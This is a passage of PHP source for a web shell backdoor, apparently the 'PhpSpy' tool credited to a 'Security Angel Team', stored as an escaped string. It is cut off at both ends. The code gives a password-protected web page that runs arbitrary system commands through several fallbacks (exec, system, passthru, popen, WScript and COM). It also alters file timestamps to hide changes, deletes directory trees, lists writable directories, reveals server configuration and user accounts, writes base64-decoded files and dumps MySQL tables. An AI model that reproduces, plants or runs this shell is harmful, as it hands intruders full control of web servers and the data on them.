&raquo;');\n\tp('year:');\n\tmakeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));\n\tp('month:');\n\tmakeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));\n\tp('day:');\n\tmakeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));\n\tp('hour:');\n\tmakeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));\n\tp('minute:');\n\tmakeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));\n\tp('second:');\n\tmakeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));\n\tp('</p>');\n\tformfooter();\n}//end newtime\n\nelseif ($action == 'shell') {\n\tif (IS_WIN && IS_COM) {\n\t\tif($program && $parameter) {\n\t\t\t$shell= new COM('Shell.Application');\n\t\t\t$a = $shell->ShellExecute($program,$parameter);\n\t\t\tm('Program run has '.(!$a ? 'success' : 'fail'));\n\t\t}\n\t\t!$program && $program = 'c:\\windows\\system32\\cmd.exe';\n\t\t!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';\n\t\tformhead(array('title'=>'Execute Program'));\n\t\tmakehide('action','shell');\n\t\tmakeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));\n\t\tp('<p>');\n\t\tmakeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));\n\t\tmakeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));\n\t\tp('</p>');\n\t\tformfoot();\n\t}\n\tformhead(array('title'=>'Execute Command'));\n\tmakehide('action','shell');\n\tif (IS_WIN && IS_COM) {\n\t\t$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');\n\t\tmakeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));\n\t}\n\tp('<p>');\n\tmakeinput(array('title'=>'Command','name'=>'command','value'=>$command));\n\tmakeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));\n\tp('</p>');\n\tformfoot();\n\n\tif ($command) {\n\t\tp('<hr width=\"100%\" noshade /><pre>');\n\t\tif ($execfunc=='wscript' && IS_WIN && IS_COM) {\n\t\t\t$wsh = new COM('WScript.shell');\n\t\t\t$exec = $wsh->exec('cmd.exe /c '.$command);\n\t\t\t$stdout = $exec->StdOut();\n\t\t\t$stroutput = $stdout->ReadAll();\n\t\t\techo $stroutput;\n\t\t} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {\n\t\t\t$descriptorspec = array(\n\t\t\t   0 => array('pipe', 'r'),\n\t\t\t   1 => array('pipe', 'w'),\n\t\t\t   2 => array('pipe', 'w')\n\t\t\t);\n\t\t\t$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);\n\t\t\tif (is_resource($process)) {\n\t\t\t\tfwrite($pipes[0], $command.\"\\r\\n\");\n\t\t\t\tfwrite($pipes[0], \"exit\\r\\n\");\n\t\t\t\tfclose($pipes[0]);\n\t\t\t\twhile (!feof($pipes[1])) {\n\t\t\t\t\techo fgets($pipes[1], 1024);\n\t\t\t\t}\n\t\t\t\tfclose($pipes[1]);\n\t\t\t\twhile (!feof($pipes[2])) {\n\t\t\t\t\techo fgets($pipes[2], 1024);\n\t\t\t\t}\n\t\t\t\tfclose($pipes[2]);\n\t\t\t\tproc_close($process);\n\t\t\t}\n\t\t} else {\n\t\t\techo(execute($command));\n\t\t}\n\t\tp('</pre>');\n\t}\n}//end shell\n\nelseif ($action == 'phpenv') {\n\t$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';\n\t$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');\n\t!$dis_func && $dis_func = 'No';\t\n\t$info = array(\n\t\t1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),\n\t\t2 => array('Server Domain',$_SERVER['SERVER_NAME']),\n\t\t3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),\n\t\t4 => array('Server OS',PHP_OS),\n\t\t5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),\n\t\t6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),\n\t\t7 => array('Server Web Port',$_SERVER['SERVER_PORT']),\n\t\t8 => array('PHP run mode',strtoupper(php_sapi_name())),\n\t\t9 => array('The file path',__FILE__),\n\n\t\t10 => array('PHP Version',PHP_VERSION),\n\t\t11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:goaction(\\'phpinfo\\');\">Yes</a>' : 'No')),\n\t\t12 => array('Safe Mode',getcfg('safe_mode')),\n\t\t13 => array('Administrator',$adminmail),\n\t\t14 => array('allow_url_fopen',getcfg('allow_url_fopen')),\n\t\t15 => array('enable_dl',getcfg('enable_dl')),\n\t\t16 => array('display_errors',getcfg('display_errors')),\n\t\t17 => array('register_globals',getcfg('register_globals')),\n\t\t18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),\n\t\t19 => array('memory_limit',getcfg('memory_limit')),\n\t\t20 => array('post_max_size',getcfg('post_max_size')),\n\t\t21 => array('upload_max_filesize',$upsize),\n\t\t22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),\n\t\t23 => array('disable_functions',$dis_func),\n\t);\n\n\tif($phpvarname) {\n\t\tm($phpvarname .' : '.getcfg($phpvarname));\n\t}\n\n\tformhead(array('title'=>'Server environment'));\n\tmakehide('action','phpenv');\n\tmakeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));\n\tformfooter();\n\n\t$hp = array(0=> 'Server', 1=> 'PHP');\n\tfor($a=0;$a<2;$a++) {\n\t\tp('<h2>'.$hp[$a].' &raquo;</h2>');\n\t\tp('<ul class=\"info\">');\n\t\tif ($a==0) {\n\t\t\tfor($i=1;$i<=9;$i++) {\n\t\t\t\tp('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');\n\t\t\t}\n\t\t} elseif ($a == 1) {\n\t\t\tfor($i=10;$i<=23;$i++) {\n\t\t\t\tp('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');\n\t\t\t}\n\t\t}\n\t\tp('</ul>');\n\t}\n}//end phpenv\n\nelse {\n\tm('Undefined Action');\n}\n\n?>\n</td></tr></table>\n<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">\n\t<span style=\"float:right;\"><?php debuginfo();ob_end_flush();?></span>\n\tCopyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved.\n</div>\n</body>\n</html>\n\n<?php\n\n/*======================================================\n???\n======================================================*/\n\nfunction m($msg) {\n\techo '<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;\">';\n\techo $msg;\n\techo '</div>';\n}\nfunction scookie($key, $value, $life = 0, $prefix = 1) {\n\tglobal $admin, $timestamp, $_SERVER;\n\t$key = ($prefix ? $admin['cookiepre'] : '').$key;\n\t$life = $life ? $life : $admin['cookielife'];\n\t$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;\n\tsetcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);\n}\t\nfunction multi($num, $perpage, $curpage, $tablename) {\n\t$multipage = '';\n\tif($num > $perpage) {\n\t\t$page = 10;\n\t\t$offset = 5;\n\t\t$pages = @ceil($num / $perpage);\n\t\tif($page > $pages) {\n\t\t\t$from = 1;\n\t\t\t$to = $pages;\n\t\t} else {\n\t\t\t$from = $curpage - $offset;\n\t\t\t$to = $curpage + $page - $offset - 1;\n\t\t\tif($from < 1) {\n\t\t\t\t$to = $curpage + 1 - $from;\n\t\t\t\t$from = 1;\n\t\t\t\tif(($to - $from) < $page && ($to - $from) < $pages) {\n\t\t\t\t\t$to = $page;\n\t\t\t\t}\n\t\t\t} elseif($to > $pages) {\n\t\t\t\t$from = $curpage - $pages + $to;\n\t\t\t\t$to = $pages;\n\t\t\t\tif(($to - $from) < $page && ($to - $from) < $pages) {\n\t\t\t\t\t$from = $pages - $page + 1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', 1);\">First</a> ' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');\n\t\tfor($i = $from; $i <= $to; $i++) {\n\t\t\t$multipage .= $i == $curpage ? $i.' ' : '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$i.');\">['.$i.']</a> ';\n\t\t}\n\t\t$multipage .= ($curpage < $pages ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage + 1).');\">Next</a>' : '').($to < $pages ? ' <a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$pages.');\">Last</a>' : '');\n\t\t$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';\n\t}\n\treturn $multipage;\n}\n// ????\nfunction loginpage() {\n?>\n\t<style type=\"text/css\">\n\tinput {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}\n\t</style>\n\t<form method=\"POST\" action=\"\">\n\t<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">\n\t<input type=\"hidden\" name=\"doing\" value=\"login\">\n\t<doingYERmum />\n\t<input type=\"submit\" value=\"Login\">\n\t</form>\n<?php\n\texit;\n}//end loginpage()\n\nfunction execute($cfe) {\n\t$res = '';\n\tif ($cfe) {\n\t\tif(function_exists('exec')) {\n\t\t\t@exec($cfe,$res);\n\t\t\t$res = join(\"\\n\",$res);\n\t\t} elseif(function_exists('shell_exec')) {\n\t\t\t$res = @shell_exec($cfe);\n\t\t} elseif(function_exists('system')) {\n\t\t\t@ob_start();\n\t\t\t@system($cfe);\n\t\t\t$res = @ob_get_contents();\n\t\t\t@ob_end_clean();\n\t\t} elseif(function_exists('passthru')) {\n\t\t\t@ob_start();\n\t\t\t@passthru($cfe);\n\t\t\t$res = @ob_get_contents();\n\t\t\t@ob_end_clean();\n\t\t} elseif(@is_resource($f = @popen($cfe,\"r\"))) {\n\t\t\t$res = '';\n\t\t\twhile(!@feof($f)) {\n\t\t\t\t$res .= @fread($f,1024); \n\t\t\t}\n\t\t\t@pclose($f);\n\t\t}\n\t}\n\treturn $res;\n}\nfunction which($pr) {\n\t$path = execute(\"which $pr\");\n\treturn ($path ? $path : $pr); \n}\n\nfunction cf($fname,$text){\n\tif($fp=@fopen($fname,'w')) {\n\t\t@fputs($fp,@base64_decode($text));\n\t\t@fclose($fp);\n\t}\n}\n\n// ??????\nfunction debuginfo() {\n\tglobal $starttime;\n\t$mtime = explode(' ', microtime());\n\t$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);\n\techo 'Processed in '.$totaltime.' second(s)';\n}\n\n//?????\nfunction dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {\n\tif(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {\n\t\tp('<h2>Can not connect to MySQL server</h2>');\n\t\texit;\n\t}\n\tif($link && $dbname) {\n\t\tif (!@mysql_select_db($dbname, $link)) {\n\t\t\tp('<h2>Database selected has error</h2>');\n\t\t\texit;\n\t\t}\n\t}\n\tif($link && mysql_get_server_info() > '4.1') {\n\t\tif(in_array(strtolower($charset), array('gbk', 'big5', 'utf8'))) {\n\t\t\tq(\"SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;\", $link);\n\t\t}\n\t}\n\treturn $link;\n}\n\n// ??????\nfunction s_array(&$array) {\n\tif (is_array($array)) {\n\t\tforeach ($array as $k => $v) {\n\t\t\t$array[$k] = s_array($v);\n\t\t}\n\t} else if (is_string($array)) {\n\t\t$array = stripslashes($array);\n\t}\n\treturn $array;\n}\n\n// ??HTML??\nfunction html_clean($content) {\n\t$content = htmlspecialchars($content);\n\t$content = str_replace(\"\\n\", \"<br />\", $content);\n\t$content = str_replace(\"  \", \"&nbsp;&nbsp;\", $content);\n\t$content = str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;\", $content);\n\treturn $content;\n}\n\n// ????\nfunction getChmod($filepath){\n\treturn substr(base_convert(@fileperms($filepath),10,8),-4);\n}\n\nfunction getPerms($filepath) {\n\t$mode = @fileperms($filepath);\n\tif (($mode & 0xC000) === 0xC000) {$type = 's';}\n\telseif (($mode & 0x4000) === 0x4000) {$type = 'd';}\n\telseif (($mode & 0xA000) === 0xA000) {$type = 'l';}\n\telseif (($mode & 0x8000) === 0x8000) {$type = '-';} \n\telseif (($mode & 0x6000) === 0x6000) {$type = 'b';}\n\telseif (($mode & 0x2000) === 0x2000) {$type = 'c';}\n\telseif (($mode & 0x1000) === 0x1000) {$type = 'p';}\n\telse {$type = '?';}\n\n\t$owner['read'] = ($mode & 00400) ? 'r' : '-'; \n\t$owner['write'] = ($mode & 00200) ? 'w' : '-'; \n\t$owner['execute'] = ($mode & 00100) ? 'x' : '-'; \n\t$group['read'] = ($mode & 00040) ? 'r' : '-'; \n\t$group['write'] = ($mode & 00020) ? 'w' : '-'; \n\t$group['execute'] = ($mode & 00010) ? 'x' : '-'; \n\t$world['read'] = ($mode & 00004) ? 'r' : '-'; \n\t$world['write'] = ($mode & 00002) ? 'w' : '-'; \n\t$world['execute'] = ($mode & 00001) ? 'x' : '-'; \n\n\tif( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}\n\tif( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}\n\tif( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}\n \n\treturn $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];\n}\n\nfunction getUser($filepath)\t{\n\tif (function_exists('posix_getpwuid')) {\n\t\t$array = @posix_getpwuid(@fileowner($filepath));\n\t\tif ($array && is_array($array)) {\n\t\t\treturn ' / <a href=\"#\" title=\"User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'\">'.$array['name'].'</a>';\n\t\t}\n\t}\n\treturn '';\n}\n\n// ????\nfunction deltree($deldir) {\n\t$mydir=@dir($deldir);\t\n\twhile($file=$mydir->read())\t{ \t\t\n\t\tif((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { \n\t\t\t@chmod($deldir.'/'.$file,0777);\n\t\t\tdeltree($deldir.'/'.$file); \n\t\t}\n\t\tif (is_file($deldir.'/'.$file)) {\n\t\t\t@chmod($deldir.'/'.$file,0777);\n\t\t\t@unlink($deldir.'/'.$file);\n\t\t}\n\t} \n\t$mydir->close(); \n\t@chmod($deldir,0777);\n\treturn @rmdir($deldir) ? 1 : 0;\n}\n\n// ??????????\nfunction bg() {\n\tglobal $bgc;\n\treturn ($bgc++%2==0) ? 'alt1' : 'alt2';\n}\n\n// ???????????\nfunction getPath($scriptpath, $nowpath) {\n\tif ($nowpath == '.') {\n\t\t$nowpath = $scriptpath;\n\t}\n\t$nowpath = str_replace('\\\\', '/', $nowpath);\n\t$nowpath = str_replace('//', '/', $nowpath);\n\tif (substr($nowpath, -1) != '/') {\n\t\t$nowpath = $nowpath.'/';\n\t}\n\treturn $nowpath;\n}\n\n// ???????????\nfunction getUpPath($nowpath) {\n\t$pathdb = explode('/', $nowpath);\n\t$num = count($pathdb);\n\tif ($num > 2) {\n\t\tunset($pathdb[$num-1],$pathdb[$num-2]);\n\t}\n\t$uppath = implode('/', $pathdb).'/';\n\t$uppath = str_replace('//', '/', $uppath);\n\treturn $uppath;\n}\n\n// ??PHP????\nfunction getcfg($varname) {\n\t$result = get_cfg_var($varname);\n\tif ($result == 0) {\n\t\treturn 'No';\n\t} elseif ($result == 1) {\n\t\treturn 'Yes';\n\t} else {\n\t\treturn $result;\n\t}\n}\n\n// ??????\nfunction getfun($funName) {\n\treturn (false !== function_exists($funName)) ? 'Yes' : 'No';\n}\n\nfunction GetList($dir){\n\tglobal $dirdata,$j,$nowpath;\n\t!$j && $j=1;\n\tif ($dh = opendir($dir)) {\n\t\twhile ($file = readdir($dh)) {\n\t\t\t$f=str_replace('//','/',$dir.'/'.$file);\n\t\t\tif($file!='.' && $file!='..' && is_dir($f)){\n\t\t\t\tif (is_writable($f)) {\n\t\t\t\t\t$dirdata[$j]['filename']=str_replace($nowpath,'',$f);\n\t\t\t\t\t$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));\n\t\t\t\t\t$dirdata[$j]['dirchmod']=getChmod($f);\n\t\t\t\t\t$dirdata[$j]['dirperm']=getPerms($f);\n\t\t\t\t\t$dirdata[$j]['dirlink']=ue($dir);\n\t\t\t\t\t$dirdata[$j]['server_link']=$f;\n\t\t\t\t\t$dirdata[$j]['client_link']=ue($f);\n\t\t\t\t\t$j++;\n\t\t\t\t}\n\t\t\t\tGetList($f);\n\t\t\t}\n\t\t}\n\t\tclosedir($dh);\n\t\tclearstatcache();\n\t\treturn $dirdata;\n\t} else {\n\t\treturn array();\n\t}\n}\n\nfunction qy($sql) { \n\t//echo $sql.'<br>';\n\t$res = $error = '';\n\tif(!$res = @mysql_query($sql)) { \n\t\treturn 0;\n\t} else if(is_resource($res)) {\n\t\treturn 1; \n\t} else {\n\t\treturn 2;\n\t}\t\n\treturn 0;\n}\n\nfunction q($sql) { \n\treturn @mysql_query($sql);\n}\n\nfunction fr($qy){\n\tmysql_free_result($qy);\n}\n\nfunction sizecount($size) {\n\tif($size > 1073741824) {\n\t\t$size = round($size / 1073741824 * 100) / 100 . ' G';\n\t} elseif($size > 1048576) {\n\t\t$size = round($size / 1048576 * 100) / 100 . ' M';\n\t} elseif($size > 1024) {\n\t\t$size = round($size / 1024 * 100) / 100 . ' K';\n\t} else {\n\t\t$size = $size . ' B';\n\t}\n\treturn $size;\n}\n\n// ?????\nclass PHPZip{\n\tvar $out='';\n\tfunction PHPZip($dir)\t{\n\t\tif (@function_exists('gzcompress'))\t{\n\t\t\t$curdir = getcwd();\n\t\t\tif (is_array($dir)) $filelist = $dir;\n\t\t\telse{\n\t\t\t\t$filelist=$this -> GetFileList($dir);//????\n\t\t\t\tforeach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);\n\t\t\t}\n\t\t\tif ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);\n\t\t\telse chdir($curdir);\n\t\t\tif (count($filelist)>0){\n\t\t\t\tforeach($filelist as $filename){\n\t\t\t\t\tif (is_file($filename)){\n\t\t\t\t\t\t$fd = fopen ($filename, 'r');\n\t\t\t\t\t\t$content = @fread ($fd, filesize($filename));\n\t\t\t\t\t\tfclose ($fd);\n\t\t\t\t\t\tif (is_array($dir)) $filename = basename($filename);\n\t\t\t\t\t\t$this -> addFile($content, $filename);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t$this->out = $this -> file();\n\t\t\t\tchdir($curdir);\n\t\t\t}\n\t\t\treturn 1;\n\t\t}\n\t\telse return 0;\n\t}\n\n\t// ??????????\n\tfunction GetFileList($dir){\n\t\tstatic $a;\n\t\tif (is_dir($dir)) {\n\t\t\tif ($dh = opendir($dir)) {\n\t\t\t\twhile ($file = readdir($dh)) {\n\t\t\t\t\tif($file!='.' && $file!='..'){\n\t\t\t\t\t\t$f=$dir .'/'. $file;\n\t\t\t\t\t\tif(is_dir($f)) $this->GetFileList($f);\n\t\t\t\t\t\t$a[]=$f;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tclosedir($dh);\n\t\t\t}\n\t\t}\n\t\treturn $a;\n\t}\n\n\tvar $datasec      = array();\n\tvar $ctrl_dir     = array();\n\tvar $eof_ctrl_dir = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";\n\tvar $old_offset   = 0;\n\n\tfunction unix2DosTime($unixtime = 0) {\n\t\t$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);\n\t\tif ($timearray['year'] < 1980) {\n\t\t\t$timearray['year']    = 1980;\n\t\t\t$timearray['mon']     = 1;\n\t\t\t$timearray['mday']    = 1;\n\t\t\t$timearray['hours']   = 0;\n\t\t\t$timearray['minutes'] = 0;\n\t\t\t$timearray['seconds'] = 0;\n\t\t} // end if\n\t\treturn (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |\n\t\t\t\t($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);\n\t}\n\n\tfunction addFile($data, $name, $time = 0) {\n\t\t$name = str_replace('\\\\', '/', $name);\n\n\t\t$dtime = dechex($this->unix2DosTime($time));\n\t\t$hexdtime\t= '\\x' . $dtime[6] . $dtime[7]\n\t\t\t\t\t. '\\x' . $dtime[4] . $dtime[5]\n\t\t\t\t\t. '\\x' . $dtime[2] . $dtime[3]\n\t\t\t\t\t. '\\x' . $dtime[0] . $dtime[1];\n\t\teval('$hexdtime = \"' . $hexdtime . '\";');\n\t\t$fr\t= \"\\x50\\x4b\\x03\\x04\";\n\t\t$fr\t.= \"\\x14\\x00\";\n\t\t$fr\t.= \"\\x00\\x00\";\n\t\t$fr\t.= \"\\x08\\x00\";\n\t\t$fr\t.= $hexdtime;\n\n\t\t$unc_len = strlen($data);\n\t\t$crc = crc32($data);\n\t\t$zdata = gzcompress($data);\n\t\t$c_len = strlen($zdata);\n\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\n\t\t$fr .= pack('V', $crc);\n\t\t$fr .= pack('V', $c_len);\n\t\t$fr .= pack('V', $unc_len);\n\t\t$fr .= pack('v', strlen($name));\n\t\t$fr .= pack('v', 0);\n\t\t$fr .= $name;\n\t\t$fr .= $zdata;\n\t\t$fr .= pack('V', $crc);\n\t\t$fr .= pack('V', $c_len);\n\t\t$fr .= pack('V', $unc_len);\n\n\t\t$this -> datasec[] = $fr;\n\t\t$new_offset = strlen(implode('', $this->datasec));\n\n\t\t$cdrec = \"\\x50\\x4b\\x01\\x02\";\n\t\t$cdrec .= \"\\x00\\x00\";\n\t\t$cdrec .= \"\\x14\\x00\";\n\t\t$cdrec .= \"\\x00\\x00\";\n\t\t$cdrec .= \"\\x08\\x00\";\n\t\t$cdrec .= $hexdtime;\n\t\t$cdrec .= pack('V', $crc);\n\t\t$cdrec .= pack('V', $c_len);\n\t\t$cdrec .= pack('V', $unc_len);\n\t\t$cdrec .= pack('v', strlen($name) );\n\t\t$cdrec .= pack('v', 0 );\n\t\t$cdrec .= pack('v', 0 );\n\t\t$cdrec .= pack('v', 0 );\n\t\t$cdrec .= pack('v', 0 );\n\t\t$cdrec .= pack('V', 32 );\n\t\t$cdrec .= pack('V', $this -> old_offset );\n\t\t$this -> old_offset = $new_offset;\n\t\t$cdrec .= $name;\n\n\t\t$this -> ctrl_dir[] = $cdrec;\n\t}\n\n\tfunction file() {\n\t\t$data    = implode('', $this -> datasec);\n\t\t$ctrldir = implode('', $this -> ctrl_dir);\n\t\treturn $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .\tpack('V', strlen($ctrldir)) . pack('V', strlen($data)) . \"\\x00\\x00\";\n\t}\n}\n\n// ?????\nfunction sqldumptable($table, $fp=0) {\n\t$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";\n\t$tabledump .= \"CREATE TABLE $table (\\n\";\n\n\t$firstfield=1;\n\n\t$fields = q(\"SHOW FIELDS FROM $table\");\n\twhile ($field = mysql_fetch_array($fields)) {\n\t\tif (!$firstfield) {\n\t\t\t$tabledump .= \",\\n\";\n\t\t} else {\n\t\t\t$firstfield=0;\n\t\t}\n\t\t$tabledump .= \"   $field[Field] $field[Type]\";\n\t\tif (!empty($field[\"Default\"])) {\n\t\t\t$tabledump .= \" DEFAULT '$field[Default]'\";\n\t\t}\n\t\tif ($field['Null'] != \"YES\") {\n\t\t\t$tabledump .= \" NOT NULL\";\n\t\t}\n\t\tif ($field['Extra'] != \"\") {\n\t\t\t$tabledump .= \" $field[Extra]\";\n\t\t}\n\t}\n\tfr($fields);\n\n\t$keys = q(\"SHOW KEYS FROM $table\");\n\twhile ($key = mysql_fetch_array($keys)) {\n\t\t$kname=$key['Key_name'];\n\t\tif ($kname != \"PRIMARY\" && $key['Non_unique'] == 0) {\n\t\t\t$kname=\"UNIQUE|$kname\";\n\t\t}\n\t\tif(!is_array($index[$kname])) {\n\t\t\t$index[$kname] = array();\n\t\t}\n\t\t$index[$kname][] = $key['Column_name'];\n\t}\n\tfr($keys);\n\n\twhile(list($kname, $columns) = @each($index)) {\n\t\t$tabledump .= \",\\n\";\n\t\t$colnames=implode($columns,\",\");\n\n\t\tif ($kname == \"PRIMARY\") {\n\t\t\t$tabledump .= \"   PRIMARY KEY ($colnames)\";\n\t\t} else {\n\t\t\tif (substr($kname,0,6) == \"UNIQUE\") {\n\t\t\t\t$kname=substr($kname,7);\n\t\t\t}\n\t\t\t$tabledump .= \"   KEY $kname ($colnames)\";\n\t\t}\n\t}\n\n\t$tabledump .= \"\\n);\\n\\n\";\n\tif ($fp) {\n\t\tfwrite($fp,$tabledump);\n\t} else {\n\t\techo $tabledump;\n\t}\n\n\t$rows = q(\"SELECT * FROM $table\");\n\t$numfields = mysql_num_fields($rows);\n\twhile ($row = mysql_fetch_array($rows)) {\n\t\t$tabledump = \"INSERT INTO $table VALUES(\";\n\n\t\t$fieldcounter=-1;\n\t\t$firstfield=1;\n\t\twhile (++$fieldcounter<$numfields) {\n\t\t\tif (!$firstfield) {\n\t\t\t\t$tabledump.=\", \";\n\t\t\t} else {\n\t\t\t\t$firstfield=0;\n\t\t\t}\n\n\t\t\tif (!isset($row[$fieldcounter])) {\n\t\t\t\t$tabledump .= \"NULL\";\n\t\t\t} else {\n\t\t\t\t$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";\n\t\t\t}\n\t\t}\n\n\t\t$tabledump .= \");\\n\";\n\n\t\tif ($fp) {\n\t\t\tfwrite($fp,$tabledump);\n\t\t} else {\n\t\t\techo $tabledump;\n\t\t}\n\t}\n\tfr($rows);\n\tif ($fp) {\n\t\tfwrite($fp,\"\\n\");\n\t} else {\n\t\techo \"\\n\";\n\t}\n}\n\nfunction ue($str){\n\treturn urlencode($str);\n}\n\nfunction p($str){\n\techo $str.\"\\n\";\n}\n\nfunction tbhead() {\n\tp('<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">');\n}\nfunction tbfoot(){\n\tp('</table>');\n}\n\nfunction makehide($name,$value=''){\n\tp(\"<input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" />\");\n}\n\nfunction makeinput($arg = array()){\n\t$arg['size'] = $arg['size'] > 0 ? \"size=\\\"$arg[size]\\\"\" : \"size=\\\"100\\\"\";\n\t$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';\n\t!$arg['type'] && $arg['type'] = 'text';\n\t$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';\n\t$arg['class'] = $arg['class'] ? $arg['class'] : 'input';\n\tif ($arg['newline']) {\n\t\tp(\"<p>$arg[title]<input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] /></p>\");\n\t} else {\n\t\tp(\"$arg[title]<input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] />\");\n\t}\n}\n\nfunction makeselect($arg = array()){\n\tif ($arg['onchange']) {\n\t\t$onchange = 'onchange=\"'.$arg['onchange'].'\"';\n\t}\n\t$arg['title'] = $arg['title'] ? $arg['title'] : '';\n\tif ($arg['newline']) p('<p>');\n\tp(\"$arg[title] <select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" $onchange>\");\n\t\tif (is_array($arg['option'])) {\n\t\t\tforeach ($arg['option'] as $key=>$value) {\n\t\t\t\tif ($arg['selected']==$key) {\n\t\t\t\t\tp(\"<option value=\\\"$key\\\" selected>$value</option>\");\n\t\t\t\t} else {\n\t\t\t\t\tp(\"<option value=\\\"$key\\\">$value</option>\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\tp(\"</select>\");\n\tif ($arg['newline']) p('</p>');\n}\nfunction formhead($arg = array()) {\n\t!$arg['method'] && $arg['method'] = 'post';\n\t!$arg['action'] && $arg['action'] = $self;\n\t$arg['target'] = $arg['target'] ? \"target=\\\"$arg[target]\\\"\" : '';\n\t!$arg['name'] && $arg['name'] = 'form1';\n\tp(\"<form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"$arg[action]\\\" method=\\\"$arg[method]\\\" $arg[target]>\");\n\tif ($arg['title']) {\n\t\tp('<h2>'.$arg['title'].' &raquo;</h2>');\n\t}\n}\n\t\nfunction maketext($arg = array()){\n\t!$arg['cols'] && $arg['cols'] = 100;\n\t!$arg['rows'] && 